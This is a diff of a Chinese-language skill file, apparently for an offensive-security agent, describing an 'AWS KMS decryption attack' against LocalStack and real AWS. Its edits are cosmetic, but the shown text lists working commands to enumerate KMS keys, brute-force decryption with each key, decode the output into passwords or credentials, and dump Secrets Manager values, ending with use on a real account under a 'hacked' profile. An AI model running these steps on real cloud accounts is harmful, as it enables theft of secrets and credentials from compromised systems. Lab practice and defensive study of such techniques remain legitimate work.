@@ -4,7 +4,7 @@ description: 'LocalStack AWS KMS解密：list-keys→遍历所有key→decrypt b
 disable-model-invocation: true
 metadata: { domain: cloud, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 ## AWS KMS 解密攻击（LocalStack + 真实 AWS）
 
@@ -19,7 +19,7 @@ metadata: { domain: cloud, tier: T3 }
 aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
 # 提取所有 KeyId
 aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | cut -d '"' -f4 > keys.txt
-```
+```text
 
 ### 暴力遍历所有 Key 解密
 ```bash
@@ -36,7 +36,7 @@ done
 
 # 检查哪个 key 成功解密（输出非空）
 wc -c *.out | grep -v "^0 "
-```
+```text
 
 ### 解密后的文件处理
 ```bash
@@ -51,13 +51,13 @@ gzip -d decoded.gz
 
 # 最终得到密码/凭据
 cat decoded
-```
+```text
 
 ### AWS Secrets Manager（同时检查）
 ```bash
 aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
 aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "<ARN>"
-```
+```text
 
 ### 真实环境 vs LocalStack
 ```bash
@@ -66,4 +66,4 @@ aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
 
 # 真实 AWS: 去掉 --endpoint-url
 aws kms list-keys --profile hacked
-```
+```text
